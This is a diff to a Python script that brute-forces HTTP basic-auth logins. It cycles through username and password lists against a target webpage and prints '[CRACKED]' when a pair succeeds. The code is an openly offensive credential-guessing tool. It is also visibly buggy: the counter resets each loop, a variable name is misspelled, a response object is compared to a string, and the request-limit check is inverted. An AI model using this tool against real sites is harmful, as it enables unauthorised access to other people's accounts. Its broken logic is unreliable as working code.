@@ -24,7 +24,7 @@ webpage = "" # name of webpage
 positive_request = "<Response [200]>" # if password and username match you will get a response of 200
 									  # check r to see result
 
-pass_file = "" # name of text file with list of passwords
+pass_file = "" # name of text file with list of passwords, must be in same directory
 user_file = "" # name of text file with list of usernames
 
 SET_LIMIT = 20000 # set a limit of how many requests can be made
@@ -34,7 +34,7 @@ info_list = [pass_file, user_file] # simplifies the FILE_DATA() function: uses o
 								   # for loops
 
 
-def FILE_DATA(): # converts files with passwords or username for each line into a python list
+def FILE_DATA(): # converts files lines into python lists
 	try:
 		for object in info_list:
 			with open(object, 'r') as file:
@@ -49,24 +49,36 @@ def FILE_DATA(): # converts files with passwords or username for each line into 
 
 
 def REQUEST(): # ask website to login with specific credentials
-	count_ = 0 # counts iterations
-	try: # trys request to connect with username and password based on iterations
-		r = requests.get(webpage)
-		if r.ok == False:
-			print(f"[{REQUEST.__name__}] issue with address, or connection")
-			exit()
-		r = requests.get(webpage, auth=(str(username[count_]), str(password[count_])))
-		# time.sleep(0.1) # could have issues with sending and receiving to quickly
-
-		if r != positive_request: # 200 is possitive everything else is an error
-			count_ += 1
-			if count_ <= SET_LIMIT:
-				print(f"[{REQUEST.__name__}] Limit Reached {SET_LIMIT}")
+	while True:
+		count_ = 0 # counts iterations
+		try: # trys request to connect using username[count_] and password[count-] 
+			r = requests.get(webpage)
+			
+			# cant connect: exits program
+			if r.ok == False:
+				print(f"[{REQUEST.__name__}] issue with address, or connection")
 				exit()
-			REQUEST()
+				
+			r = requests.get(webpage, auth=(str(username[count_]), str(password[count_])))
+			count_ += 1
+			
+			# FOUND: username and password
+			if r == positive_request:
+				print(f"[CRACKED] ================================ [-]\n[-] Username: {username[count_]} Password: {password[count_]} ")
+			        # time.sleep(0.1) # possible issue: to many requests within a short time period of time
+			else:
+				# username and passwords tried
+				print(f"[-] {usernmae[count_]} {password[count_]}")
 
-	except:
-		print(f"[{REQUEST.__name__}] Error: try: in  'r = request.get()'")
+			if r != positive_request: # 200 is possitive everything else is an error
+			
+				if count_ <= SET_LIMIT:
+					print(f"[{REQUEST.__name__}] Limit Reached {SET_LIMIT}")
+					exit()
+			
+
+		except:
+			print(f"[{REQUEST.__name__}] Error: try: in  'r = request.get()'")
 
 if __name__ == '__main__':
 	FILE_DATA()
